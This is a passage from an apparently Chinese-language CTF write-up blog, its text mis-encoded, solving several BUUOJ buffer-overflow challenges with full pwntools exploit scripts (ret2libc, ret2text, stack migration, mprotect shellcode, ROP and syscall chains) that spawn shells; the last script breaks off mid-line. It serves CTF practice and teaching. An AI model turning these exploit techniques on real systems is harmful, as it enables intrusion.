class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/01/eEQf6L8dWs2hmk7.png"></p>
<h2 id="0x032-picoctf-2018-buffer-overflow-2-ret2libc"><a href="#0x032-picoctf-2018-buffer-overflow-2-ret2libc" class="headerlink" title="0x032.picoctf_2018_buffer overflow 2 - ret2libc"></a>0x032.picoctf_2018_buffer overflow 2 - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>chekcsec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2021/02/01/Eu7V4FOHR6xfALa.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªgetsæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/02/01/fwmOTZVWLc9DHya.png"></p>
<p>ç”±äºæ²¡æœ‰èƒ½ç›´æ¥get shellçš„å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libc</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_2&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_2&#x27;</span>) </span><br><span class="line">offset = <span class="number">0x6c</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">addr = p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr = u32(addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/01/Qi8D6KcjJaPpbyq.png"></p>
<blockquote>
<p>ç›´æ¥æŠŠoverflow1çš„expæ”¹ä¸€ä¸‹å°±èƒ½è¿‡äº†â€¦</p>
</blockquote>
<h2 id="0x033-wustctf2020-getshell-ret2text"><a href="#0x033-wustctf2020-getshell-ret2text" class="headerlink" title="0x033.wustctf2020_getshell - ret2text"></a>0x033.wustctf2020_getshell - ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2021/02/01/tIesqmfnBPlAgx1.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ,å­˜åœ¨æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/02/01/e9RrFPN8jJT4g5M.png"></p>
<p>åŒæ—¶å­˜åœ¨åé—¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/02/01/Dkl7FtfjYPodu5Q.png"></p>
<p>æ•…è€ƒè™‘ret2textæ‰§è¡Œåé—¨å‡½æ•°å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804851b</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./wustctf2020_getshell&#x27;</span>)<span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,27471)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2021/02/01/nupX24A7yejRqlw.png"></p>
<h2 id="0x034-bbys-tu-2016-ret2text"><a href="#0x034-bbys-tu-2016-ret2text" class="headerlink" title="0x034.bbys_tu_2016 - ret2text"></a>0x034.bbys_tu_2016 - ret2text</h2><p>æƒ¯ä¾‹çš„<code>chekcsec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2021/02/01/LrDqPzmtZW6NV7A.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/02/01/cTNupzvWYnZ937A.png"></p>
<p>æœ‰ä¸€ä¸ªèƒ½ç›´æ¥è¯»flagçš„å‡½æ•°ï¼Œæº¢å‡ºåˆ°è¿™å³å¯</p>
<p><img src="https://i.loli.net/2021/02/01/hsdVW2SMNkBUbqi.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bbys_tu_2016&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25054)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bbys_tu_2016&#x27;</span>) </span><br><span class="line">offset = <span class="number">0x14</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;printFlag&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get flag</p>
<p><img src="https://i.loli.net/2021/02/01/Q5F8mfisazVTqyo.png"></p>
<h2 id="0x035-xdctf2015-pwn200-ret2libc"><a href="#0x035-xdctf2015-pwn200-ret2libc" class="headerlink" title="0x035.xdctf2015_pwn200 - ret2libc"></a>0x035.xdctf2015_pwn200 - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>chekcsec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2021/02/01/aZAjEc6w5CS3bUz.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/02/01/QlLoVfjt9qM4XrY.png"></p>
<p>ç”±äºæ²¡æœ‰èƒ½ç›´æ¥get shellçš„å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libc</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25987)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bof&#x27;</span>) </span><br><span class="line">offset = <span class="number">0x6c</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv() </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/01/Ba1Pq6KiZew9yxV.png"></p>
<blockquote>
<p>å­¦é•¿ä»¬å‡ºçš„é¢˜ï¼Œæ²¡æƒ³åˆ°çŸ­çŸ­5å¹´æ—¶é—´CTF-pwnçš„ä¸»æµå°±ä»ç®€å•çš„æ ˆæº¢å‡ºåˆ°äº†ç°åœ¨çš„å„ç§å¤æ‚çš„å †åˆ©ç”¨æ‰‹æ³•â€¦ç°åœ¨çš„å¤§æ¯”èµ›å“ªæ€•æ˜¯ç­¾åˆ°é¢˜éƒ½è‡³å°‘æ˜¯tcache double freeèµ·æ‰‹â€¦</p>
<p><del>ä¸è¿‡15å¹´è¯´ä¸å®šéƒ½æ²¡æœ‰pwntoolså’ŒLibcSearcherè¿™æ ·æ–¹ä¾¿çš„pythonåº“</del></p>
<p>ä»¥åŠè¿™é“é¢˜å’Œå‰é¢çš„0x37å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼ˆx</p>
</blockquote>
<h2 id="0x036-gyctf-2020-borrowstack-ret2csu-ret2libc-stack-migration"><a href="#0x036-gyctf-2020-borrowstack-ret2csu-ret2libc-stack-migration" class="headerlink" title="0x036.gyctf_2020_borrowstack - ret2csu + ret2libc + stack migration"></a>0x036.gyctf_2020_borrowstack - ret2csu + ret2libc + stack migration</h2><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œåªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2021/02/01/zW2I7G4xtuiNkHa.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/02/01/PLdljpqYJRs24GC.png"></p>
<p>ç¬¬ä¸€æ¬¡è¯»åˆ°æ ˆä¸Šæº¢å‡º0x10å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡è¯»åˆ°bssæ®µä¸Šï¼Œæš—ç¤ºæˆ‘ä»¬è¿›è¡Œæ ˆè¿ç§»</p>
<p>ç”±äºæ²¡æœ‰åé—¨å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libcï¼Œä½¿ç”¨æ ˆè¿ç§»åœ¨bssæ®µæ„é€ ropé“¾æ‰§è¡Œone_gadgetï¼ˆé¢˜ç›®å·²ç»™å‡ºlibcç‰ˆæœ¬ï¼Œ ä»¥åŠä¸æ˜åŸå› <code>system(&quot;/bin/sh&quot;)</code>æ— æ³•æ‰§è¡Œï¼‰</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯bssæ®µç¦»gotè¡¨æ¯”è¾ƒè¿‘ï¼Œéœ€è¦å…ˆæŠ¬é«˜æ ˆ</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25454)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">back_to_read = <span class="number">0x400680</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">offset = <span class="number">0x60</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(bss_addr) + p64(leave_ret)</span><br><span class="line">payload2 = p64(ret) * <span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload2)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(bss_addr) + p64(libc_base + one_gadget)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/01/DFX1v28W9YEmSKg.png"></p>
<h2 id="0x037-inndy-rop-ret2shellcode-ret2text-ret2syscall-orw"><a href="#0x037-inndy-rop-ret2shellcode-ret2text-ret2syscall-orw" class="headerlink" title="0x037.inndy_rop - ret2shellcode | ret2text | ret2syscall | orw"></a>0x037.inndy_rop - ret2shellcode | ret2text | ret2syscall | orw</h2><p>æƒ¯ä¾‹çš„<code>chekcsec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2021/02/01/sDUmdGvefPJ6Int.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/02/01/pEYSdzKGOtARiPQ.png"></p>
<h3 id="è§£æ³•ä¸€ï¼šret2shellcode"><a href="#è§£æ³•ä¸€ï¼šret2shellcode" class="headerlink" title="è§£æ³•ä¸€ï¼šret2shellcode"></a>è§£æ³•ä¸€ï¼šret2shellcode</h3><p>ç”±äºé™æ€ç¼–è¯‘å°è£…äº†mprotectï¼Œè€ƒè™‘ä¿®æ”¹bssæ®µæ‰§è¡Œæƒé™ååœ¨bssæ®µæ„é€ shellcodeåè¿”å›è‡³bsså³å¯get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;mprotect&#x27;</span>]) + p32(pop_esi_pop_ebx_pop_edx_ret) + p32(e.bss() &amp; <span class="number">0xffff000</span>) + p32(<span class="number">0x2000</span>) + p32(<span class="number">7</span>) + p32(e.sym[<span class="string">&#x27;gets&#x27;</span>]) + p32(e.bss()) + p32(e.bss())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/01/c87TDlSWLM65mfX.png"></p>
<h3 id="è§£æ³•äºŒï¼šret2text-with-ROPgadget"><a href="#è§£æ³•äºŒï¼šret2text-with-ROPgadget" class="headerlink" title="è§£æ³•äºŒï¼šret2text with ROPgadget"></a>è§£æ³•äºŒï¼šret2text with ROPgadget</h3><p>åŒæ ·çš„ï¼Œè¿™ä¸€é¢˜ä¹Ÿå¯ä»¥ä½¿ç”¨<code>ROPgadget</code>æ‰€æä¾›çš„payloadä»¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26508</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>():</span><br><span class="line">	<span class="comment"># Padding goes here</span></span><br><span class="line">	p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">	p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">	p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line">	</span><br><span class="line">p.sendline(offset * <span class="string">b&#x27;A&#x27;</span> + p32(<span class="number">0xdeadbeef</span>) + payload())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/01/L3TcHlspvK6GkYy.png"></p>
<h3 id="è§£æ³•ä¸‰ï¼šret2syscall"><a href="#è§£æ³•ä¸‰ï¼šret2syscall" class="headerlink" title="è§£æ³•ä¸‰ï¼šret2syscall"></a>è§£æ³•ä¸‰ï¼šret2syscall</h3><p>ç”±äºå­˜åœ¨å¤§é‡çš„syscall gadgetï¼Œæ•…ä¹Ÿå¯ä»¥è€ƒè™‘ret2syscallä»¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x80de769</span></span><br><span class="line">pop_edx_ret = <span class="number">0x806ecda</span></span><br><span class="line">pop_ebx_pop_edx_ret = <span class="number">0x806ecd9</span></span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line">pop_eax_ret = <span class="number">0x80b8016</span></span><br><span class="line">syscall = <span class="number">0x80627cd</span></span><br><span class="line">int_0x80 = <span class="number">0x806c943</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;gets&#x27;</span>]) + p32(pop_edx_ret) + p32(e.bss()) + p32(pop_eax_ret) + p32(<span class="number">11</span>) + p32(pop_ebx_pop_edx_ret) + p32(e.bss()) + p32(<span class="number">0</span>) + p32(pop_ecx_ret) + 